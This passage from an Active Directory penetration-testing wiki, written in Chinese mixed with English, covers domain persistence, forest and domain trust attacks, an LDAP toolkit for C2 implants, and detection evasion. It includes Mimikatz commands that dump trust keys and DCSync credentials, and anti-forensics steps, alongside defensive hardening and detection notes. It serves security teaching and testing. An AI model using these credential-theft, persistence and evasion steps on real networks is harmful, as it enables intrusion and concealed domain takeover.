这类票据类似 golden tickets，但其伪造方式可以 **bypass common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有某个账户的 certificates 或者能够请求它们**，是实现该用户账户 persistence 的一种很好的方式（即使他更改密码也是如此）：

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**使用 certificates 也可以在域内以高权限方式保持 persistence：**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** object 通过在这些 privileged groups 上应用标准的 **Access Control List (ACL)**，来确保 **privileged groups**（如 Domain Admins 和 Enterprise Admins）的安全，从而防止未授权更改。However，这个功能也可以被利用；如果攻击者修改 AdminSDHolder 的 ACL，让一个普通用户拥有完全访问权限，那么该用户就会获得对所有 privileged groups 的广泛控制。这个旨在保护的安全机制因此可能反噬，除非被密切监控，否则会导致不应有的访问。

[**关于 AdminDSHolder Group 的更多信息在这里。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

在每台 **Domain Controller (DC)** 内部，都存在一个 **local administrator** 账户。通过在这种机器上获取 admin 权限，可以使用 **mimikatz** 提取本地 Administrator hash。随后，需要修改 registry 来 **enable the use of this password**，从而允许远程访问本地 Administrator 账户。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以向某个特定 domain objects 上的 **user** **give** 一些 **special permissions**，这样该用户将来就能 **escalate privileges in the future**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** 用于 **store** 一个 **object** 相对于另一个 **object** 所拥有的 **permissions**。如果你只是对某个 object 的 **security descriptor** 做一点小改动，就可以在不成为 privileged group 成员的情况下，获得该 object 上非常有趣的权限。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

滥用 `dynamicObject` auxiliary class 来创建短生命周期的 principals/GPOs/DNS records，并设置 `entryTTL`/`msDS-Entry-Time-To-Die`；它们会在没有 tombstones 的情况下自删除，抹去 LDAP evidence，同时留下孤立的 SIDs、损坏的 `gPLink` references，或缓存的 DNS responses（例如，AdminSDHolder ACE pollution 或恶意 `gPCFileSysPath`/AD-integrated DNS redirects）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

修改内存中的 **LSASS**，建立一个 **universal password**，从而授予所有域账户访问权限。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[在这里了解什么是 SSP (Security Support Provider)。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建自己的 **SSP**，以 **capture** 以明文形式用于访问机器的 credentials。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它会在 AD 中注册一个 **new Domain Controller**，并利用它向指定对象 **push attributes**（SIDHistory、SPNs...），同时 **without** 留下任何关于这些 **modifications** 的 **logs**。你 **need DA** 权限，并且必须位于 **root domain**。\
注意，如果你使用了错误的数据，就会出现非常糟糕的日志。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

前面我们讨论了如果你有足够权限读取 LAPS passwords，如何提升权限。然而，这些 passwords 也可以用来 **maintain persistence**。\
查看：


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着 **compromising a single domain could potentially lead to the entire Forest being compromised**。

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，使一个 **domain** 的用户能够访问另一个 **domain** 中的资源。它本质上是在两个域的认证系统之间建立连接，使认证验证能够顺畅流动。当域建立 trust 时，它们会在各自的 **Domain Controllers (DCs)** 中交换并保留特定的 **keys**，这些 key 对 trust 的完整性至关重要。

在典型场景中，如果用户想要访问一个 **trusted domain** 中的服务，他必须先向自己域的 DC 请求一个特殊票据，称为 **inter-realm TGT**。这个 TGT 使用两个域约定的共享 **key** 加密。然后用户把这个 TGT 提交给 **trusted domain 的 DC** 来获取 service ticket（**TGS**）。当 trusted domain 的 DC 成功验证 inter-realm TGT 后，它会签发一个 TGS，授予用户对该服务的访问权限。

**Steps**:

1. **Domain 1** 中的一台 **client computer** 使用其 **NTLM hash** 向自己的 **Domain Controller (DC1)** 请求一个 **Ticket Granting Ticket (TGT)**。
2. 如果客户端认证成功，DC1 会签发一个新的 TGT。
3. 然后客户端向 DC1 请求一个 **inter-realm TGT**，这是访问 **Domain 2** 中资源所需的。
4. inter-realm TGT 使用 DC1 和 DC2 在双向 domain trust 中共享的 **trust key** 加密。
5. 客户端将 inter-realm TGT 送到 **Domain 2's Domain Controller (DC2)**。
6. DC2 使用其共享 trust key 验证 inter-realm TGT，如果有效，就会为客户端想要访问的 Domain 2 中的服务器签发一个 **Ticket Granting Service (TGS)**。
7. 最后，客户端把这个 TGS 提交给服务器，该 TGS 使用服务器账户 hash 加密，以获取对 Domain 2 中该服务的访问权限。

### Different trusts

需要注意的是，**trust** 可以是单向也可以是双向。在双向选项中，两个域彼此 trust；而在 **1 way** trust relation 中，其中一个域是 **trusted** domain，另一个是 **trusting** domain。后一种情况下，**你只能从 trusted one 访问 trusting domain 内的资源**。

如果 Domain A trust Domain B，那么 A 是 trusting domain，B 是 trusted one。并且在 **Domain A** 中，这将是一个 **Outbound trust**；在 **Domain B** 中，这将是一个 **Inbound trust**。

**Different trusting relationships**

- **Parent-Child Trusts**: 这是同一 forest 内常见的设置，其中子域会自动与其父域建立双向 transitive trust。实际上，这意味着认证请求可以在父域和子域之间顺畅流动。
- **Cross-link Trusts**: 也称为 "shortcut trusts"，它们是在子域之间建立的，用于加快 referral processes。在复杂 forest 中，认证 referrals 通常必须先到 forest root，再到目标域。通过创建 cross-links，可以缩短路径，这在地理上分散的环境中尤其有益。
- **External Trusts**: 这些 trust 建立在不同且互不相关的域之间，并且本质上是 non-transitive。根据 [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 对于访问当前 forest 之外且未通过 forest trust 连接的域中的资源很有用。通过 external trusts 的 SID filtering 可增强安全性。
- **Tree-root Trusts**: 这些 trust 会在 forest root domain 与新加入的 tree root 之间自动建立。虽然不常见，但 tree-root trusts 对于向 forest 添加新的 domain trees 很重要，使其能够保持独特的 domain name，并确保双向 transitivity。更多信息可见 [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**: 这类 trust 是两个 forest root domains 之间的双向 transitive trust，同时也会强制 SID filtering 以增强安全措施。
- **MIT Trusts**: 这类 trust 建立在非 Windows、[RFC4120-compliant](https://tools.ietf.org/html/rfc4120) 的 Kerberos domains 上。MIT trusts 更加专门化，适用于需要与 Windows 生态系统之外基于 Kerberos 的系统集成的环境。

#### Other differences in **trusting relationships**

- trust relationship 也可以是 **transitive**（A trust B，B trust C，那么 A trust C）或 **non-transitive**。
- trust relationship 也可以设置为 **bidirectional trust**（双方互相 trust）或 **one-way trust**（只有一方 trust 另一方）。

### Attack Path

1. **Enumerate** trusting relationships
2. 检查是否有任何 **security principal**（user/group/computer）可以 **access** 另一域的资源，也许是通过 ACE entries 或者成为另一个域的 group 成员。查找跨域的 **relationships**（创建这个 trust 也许正是为了这个）。
1. 在这里 kerberoast 也可能是另一种选择。
3. **Compromise** 能够跨域 **pivot** 的 **accounts**。

具有权限通过三种主要机制访问另一个域中资源的攻击者：

- **Local Group Membership**: principals 可能被添加到机器上的 local groups，例如服务器上的 “Administrators” group，从而获得对该机器的强控制权。
- **Foreign Domain Group Membership**: principals 也可以是 foreign domain 中某些 groups 的成员。不过，这种方法的有效性取决于 trust 的性质以及 group 的范围。
- **Access Control Lists (ACLs)**: principals 可能被指定在 **ACL** 中，特别是作为 **DACL** 中的 **ACEs**，从而让他们访问特定资源。想深入了解 ACLs、DACLs 和 ACEs 机制的人，可以参考白皮书 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ，它是非常宝贵的资源。

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** 来查找域中的 foreign security principals。它们会是来自 **an external domain/forest** 的 user/group。

你可以在 **Bloodhound** 中检查这一点，或者使用 powerview：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### 子到父 forest 权限提升
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
枚举域信任的其他方法：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 有 **2 个 trusted keys**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_。\
> 你可以使用当前 domain 的那个通过以下方式获取：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

通过利用 trust 和 SID-History injection，将权限提升为 Enterprise admin，从 child/parent domain 中进行提权：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

理解 Configuration Naming Context (NC) 如何被利用至关重要。Configuration NC 作为 Active Directory (AD) 环境中整个 forest 配置数据的中心存储库。这些数据会复制到 forest 中的每个 Domain Controller (DC)，而可写的 DC 会维护一份可写的 Configuration NC 副本。要利用这一点，必须在一个 DC 上拥有 **SYSTEM privileges**，最好是 child DC。

**Link GPO to root DC site**

Configuration NC 的 Sites 容器包含了 AD forest 中所有已加入 domain 的计算机站点信息。通过在任意 DC 上以 SYSTEM privileges 运行，攻击者可以将 GPO 关联到 root DC sites。此操作通过篡改应用于这些站点的策略，可能会危及 root domain。

更深入的信息可以参考关于 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) 的研究。

**Compromise any gMSA in the forest**

一种攻击向量是针对 domain 中具有特权的 gMSA。用于计算 gMSA passwords 的关键 KDS Root key 存储在 Configuration NC 中。借助任意 DC 上的 SYSTEM privileges，可以访问 KDS Root key，并计算 forest 中任何 gMSA 的 passwords。

详细分析和逐步指导可见于：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的 delegated MSA attack（BadSuccessor – abusing migration attributes）：

{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

更多外部研究：[Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)。

**Schema change attack**

这种方法需要耐心等待新的特权 AD objects 被创建。拥有 SYSTEM privileges 后，攻击者可以修改 AD Schema，从而赋予任意 user 对所有 classes 的完全控制。这可能导致对新创建的 AD objects 的未授权访问和控制。

更多内容可参考 [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)。

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability 目标是控制 Public Key Infrastructure (PKI) objects，以创建一个 certificate template，从而实现以 forest 内任意 user 身份进行 authentication。由于 PKI objects 位于 Configuration NC，攻陷一个可写的 child DC 便可执行 ESC5 attacks。

关于这一点的更多细节可见 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)。在没有 ADCS 的场景中，攻击者也可以部署所需组件，如 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) 中所述。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在这种场景中，**你的域**被一个外部域信任，因而你对它拥有**未确定的权限**。你需要找出**你域中的哪些 principals 对外部域拥有哪些访问权限**，然后尝试利用它：

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在这种场景下，**your domain** 正在向来自**different domains** 的主体授予一些**privileges**。

不过，当 **domain is trusted** 被 trusting domain 信任时，trusted domain 会创建一个带有**可预测名称**的 **user**，并把 **trusted password** 作为其 **password**。这意味着可以从 trusting domain 访问一个 user，从而进入 trusted domain，对其进行枚举并尝试提升更多 privileges：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种 compromise trusted domain 的方法是找到一个 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)，它是在 domain trust 的**相反方向**创建的（这并不常见）。

另一种 compromise trusted domain 的方法是，等待一个 **user from the trusted domain can access** 的机器，然后通过 **RDP** 登录。之后，attacker 可以在 RDP session process 中注入 code，并从那里**access the origin domain of the victim**。\
此外，如果 **victim mounted his hard drive**，attacker 还可以从 **RDP session** process 中把 **backdoors** 存到硬盘的 **startup folder** 里。这种 technique 叫做 **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- 利用 forest trusts 跨越 SID history attribute 的攻击风险可通过 SID Filtering 缓解，该功能默认在所有 inter-forest trusts 上启用。这基于这样一个假设：intra-forest trusts 是安全的，并且按照 Microsoft 的立场，forest 而不是 domain 才是 security boundary。
- 但是，有一个问题：SID filtering 可能会影响 applications 和 user access，因此有时会被关闭。

### **Selective Authentication:**

- 对于 inter-forest trusts，使用 Selective Authentication 可以确保两个 forests 的 users 不会被自动 authenticated。相反，users 需要显式 permissions 才能访问 trusting domain 或 forest 中的 domains 和 servers。
- 需要注意的是，这些措施并不能防护对可写的 Configuration Naming Context (NC) 的利用，也不能防护对 trust account 的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 以 x64 Beacon Object Files 的形式重新实现了 bloodyAD 风格的 LDAP primitives，它们可以完全在 on-host implant（例如 Adaptix C2）内部运行。Operators 使用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该包，加载 `ldap.axs`，然后从 beacon 调用 `ldap <subcommand>`。所有 traffic 都通过当前 logon security context 走 LDAP（389），并启用 signing/sealing，或通过 LDAPS（636）并自动 trust certificate，因此不需要 socks proxies 或 disk artifacts。

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, 和 `get-groupmembers` 会将短名称/OU paths 解析为完整 DNs，并转储相应 objects。
- `get-object`, `get-attribute`, 和 `get-domaininfo` 会拉取任意 attributes（包括 security descriptors）以及来自 `rootDSE` 的 forest/domain metadata。
- `get-uac`, `get-spn`, `get-delegation`, 和 `get-rbcd` 会直接从 LDAP 暴露 roasting candidates、delegation settings，以及现有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors。
- `get-acl` 和 `get-writable --detailed` 会解析 DACL，列出 trustees、rights（GenericAll/WriteDACL/WriteOwner/attribute writes）以及 inheritance，从而立即给出 ACL privilege escalation 的目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### 用于提权与持久化的 LDAP 写入原语

- 对象创建 BOFs（`add-user`、`add-computer`、`add-group`、`add-ou`）允许操作员在存在 OU 权限的任何位置布置新的主体或机器账户。`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 在找到 write-property 权限后可直接劫持目标。
- 以 ACL 为重点的命令，如 `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite` 和 `add-dcsync`，会把任何 AD 对象上的 WriteDACL/WriteOwner 转化为重置密码、控制组成员关系或 DCSync 复制权限，而且不会留下 PowerShell/ADSI 痕迹。对应的 `remove-*` 命令可清理注入的 ACE。

### 委派、roasting，以及 Kerberos 滥用

- `add-spn`/`set-spn` 会立即让被入侵的用户变得可 Kerberoast；`add-asreproastable`（UAC 切换）会将其标记为可进行 AS-REP roasting，而无需改动密码。
- 委派宏（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）会从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，从而启用 constrained/unconstrained/RBCD 攻击路径，并且不再需要远程 PowerShell 或 RSAT。

### sidHistory 注入、OU 迁移，以及攻击面塑形

- `add-sidhistory` 会把高权限 SID 注入到受控主体的 SID history 中（参见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 完整实现隐蔽的访问继承。
- `move-object` 会更改计算机或用户的 DN/OU，使攻击者能把资产拖入那些已经存在委派权限的 OU，再滥用 `set-password`、`add-groupmember` 或 `add-spn`。
- 严格限定范围的移除命令（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）允许操作员在收集到凭据或持久化后快速回滚，尽量减少遥测痕迹。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一些通用防御

[**在这里了解更多关于如何保护凭据。**](../stealing-credentials/credentials-protections.md)

### **凭据保护的防御措施**

- **Domain Admins 限制**：建议仅允许 Domain Admins 登录到 Domain Controllers，避免在其他主机上使用他们。
- **服务账号权限**：服务不应使用 Domain Admin（DA）权限运行，以保持安全。
- **临时权限限制**：对于需要 DA 权限的任务，应限制其持续时间。可通过以下方式实现：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 缓解**：审计 Event IDs 2889/3074/3075，然后在 DCs/clients 上强制启用 LDAP signing 和 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket 活动的协议级指纹识别

如果你想检测常见的 AD tradecraft，**不要只依赖操作员可控的痕迹**，例如重命名的二进制文件、服务名、临时批处理文件或输出路径。先基线合法 Windows 客户端如何构建 [Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC 和 WMI 流量，然后寻找即使操作员修改了 `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py` 或 `ntlmrelayx.py` 仍然存在的**实现特征**。

- **高置信度的独立候选项**（在你的基线中验证后）：
- 经过认证的 DCE/RPC 使用 `auth_context_id = 79231 + ctx_id`
- DCE/RPC 认证填充使用 `0xff`
- LDAP Kerberos bind 将原始 Kerberos `AP-REQ` 直接放入 SPNEGO `mechToken`
- SMB2/3 协商请求中 `ClientGuid` 看起来像 ASCII 字符串
- WMI `IWbemLevel1Login::NTLMLogin` 使用非标准命名空间 `//./root/cimv2`
- 硬编码的 Kerberos nonce 值
- **更适合作为关联/评分特征**：
- 稀疏或重复的 Kerberos etype 列表、异常/缺失的 `PA-DATA`，或与原生 Windows 不同的 TGS-REQ etype 顺序
- 缺少版本信息的 NTLM Type 1 消息，或主机名为空的 Type 3 消息
- 在 DCE/RPC 中携带原始 NTLMSSP 而不是 SPNEGO、缺少 DCE/RPC verification trailers，或 SPNEGO/Kerberos OID 不匹配
- 同一主机/用户/会话/时间窗口内出现其中多个特征，比任何单一弱字段都更强
- **仅作为丰富信息使用，不要单独作为告警**：
- 默认文件名、输出路径、随机服务名、临时批处理名、默认计算机账户名，以及工具特定的 HTTP/WebDAV/RDP/MSSQL 字符串
- 这些内容很容易被操作员修改，最好用来解释为什么跨协议聚类可疑
- **操作说明**：
- 某些信号需要解密流量、[PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW 或服务端可见性
- 在将其升级为告警前，先用 Samba/Linux 客户端、appliances 和遗留软件进行验证
- 随着对基线的信心增强，把检测从丰富信息 -> hunting -> 告警逐步升级

### **实施 deception techniques**

- 实施 deception 涉及设置陷阱，例如诱饵用户或计算机，并配备诸如密码不过期或标记为 Trusted for Delegation 等特征。一个详细的方法包括创建具有特定权限的用户或将其加入高权限组。
- 一个实际示例是使用如下工具：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 关于部署 deception techniques 的更多内容可在 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) 找到。

### **识别 deception**

- **针对 User Objects**：可疑指标包括异常的 ObjectSID、登录频率低、创建日期，以及较少的 bad password counts。
- **通用指标**：比较潜在诱饵对象与真实对象的属性差异，可以发现不一致。像 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 这样的工具可帮助识别此类 deception。

### **绕过检测系统**

- **Microsoft ATA Detection Bypass**：
- **User Enumeration**：避免在 Domain Controllers 上进行 session enumeration，以防触发 ATA 检测。
- **Ticket Impersonation**：在创建 ticket 时使用 **aes** keys 有助于通过不降级到 NTLM 来规避检测。
- **DCSync Attacks**：建议从非 Domain Controller 执行，以避免 ATA 检测，因为直接从 Domain Controller 执行会触发告警。

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)

{{#include ../../banners/hacktricks-training.md}}
